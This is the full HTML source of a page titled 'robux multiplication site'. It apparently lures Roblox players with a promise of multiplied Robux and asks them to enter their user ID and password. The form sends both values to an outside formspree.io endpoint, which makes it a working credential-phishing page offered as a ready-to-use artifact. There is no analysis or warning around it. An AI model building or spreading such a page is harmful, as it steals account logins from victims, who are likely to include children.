<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>robux multiplication site</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 80px;
      background-color: #f5f5f5;
    }

    h2 {
      font-size: 32px;
      margin-bottom: 40px;
    }

    .field {
      position: relative;
      display: inline-block;
    }

    input {
      font-size: 26px;
      padding: 20px;
      width: 360px;
      margin-bottom: 25px;
      border-radius: 10px;
      border: 2px solid #ccc;
    }

    .toggle {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 18px;
      cursor: pointer;
      user-select: none;
      color: #555;
    }

    button {
      font-size: 26px;
      padding: 18px 60px;
      border-radius: 10px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <h2>Enter Information</h2>

  <form action="https://formspree.io/f/mykyoqjb" method="POST">
    <input
      type="text"
      name="user_id"
      placeholder="Your ID"
      required
    ><br>

    <div class="field">
      <input
        type="password"
        id="password"
        name="user_password"
        placeholder="Your Password"
        required
      >
      <span class="toggle" onclick="togglePassword()">Show</span>
    </div>
    <br>

    <button type="submit">Submit</button>
  </form>

  <script>
    function togglePassword() {
      const pw = document.getElementById("password");
      const toggle = document.querySelector(".toggle");

      if (pw.type === "password") {
        pw.type = "text";
        toggle.textContent = "Hide";
      } else {
        pw.type = "password";
        toggle.textContent = "Show";
      }
    }
  </script>

</body>
</html>
